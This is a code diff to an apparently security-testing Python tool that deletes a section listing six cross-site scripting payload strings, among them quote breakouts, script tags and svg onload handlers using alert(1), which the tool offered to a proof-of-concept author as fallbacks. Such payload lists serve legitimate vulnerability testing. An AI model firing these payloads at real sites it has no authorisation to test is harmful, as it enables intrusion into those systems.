@@ -260,28 +260,3 @@ def write_manual_scaffold(
         ],
         "setup_results": setup_results or [],
     }, indent=2))
-
-
-# ---------- W4: payload variants -----------------------------------------------------
-
-# A short pre-curated list of XSS payload variants for W4. The PoC author is given these
-# as additional options to try when its primary payload fails.
-XSS_PAYLOAD_VARIANTS = [
-    # Single-quote breakout
-    "evil'><svg onload=alert(1)>",
-    # Double-quote breakout
-    'evil"><svg onload=alert(1)>',
-    # Tag breakout in HTML text
-    "<script>alert(1)</script>",
-    # Event handler in attribute (works on unquoted attrs)
-    " onfocus=alert(1) autofocus ",
-    # JS context: close string + statement
-    "';alert(1);//",
-    # SVG-onload polyglot
-    '"><svg/onload=alert(1)>',
-]
-
-
-def get_payload_variants(cap: int = 6) -> list[str]:
-    """Return up to `cap` XSS payload variants for W4."""
-    return XSS_PAYLOAD_VARIANTS[:cap]
